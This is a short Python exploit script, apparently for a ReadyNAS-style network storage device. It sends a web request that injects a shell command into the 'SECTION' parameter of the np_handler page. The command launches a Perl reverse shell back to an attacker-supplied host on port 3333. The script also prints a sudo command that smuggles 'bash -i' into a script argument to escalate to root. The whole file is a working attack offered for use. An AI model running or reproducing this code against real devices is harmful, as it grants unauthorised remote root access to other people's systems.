#!/usr/bin/env python
import sys
from requests import get

'''Lazy exploit is lazy'''

def pwn(local,remote):
    res = 
get('http://%s/np_handler/'%local,params={'PAGE':'Nasstate','OPERATION':'get','SECTION':'`perl 
-e \'use 
Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(3333,inet_aton("%s")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash 
-i");};\'`' % remote})

def main():
    if len(sys.argv) != 3:
        sys.exit("Usage: %s local_ip remote_up" % sys.argv[0])
    raw_input("Listen for connect back on port 3333 (nc -l -p 3333) then 
press enter to continue")
    print "Now run this in your shell: sudo 
/frontview/bin/check_dir_compatibility.pl create 'root' 
'/tmp/asdf1\";bash -i; echo \"'"
    pwn(sys.argv[1],sys.argv[2])

if __name__=="__main__":
    main()
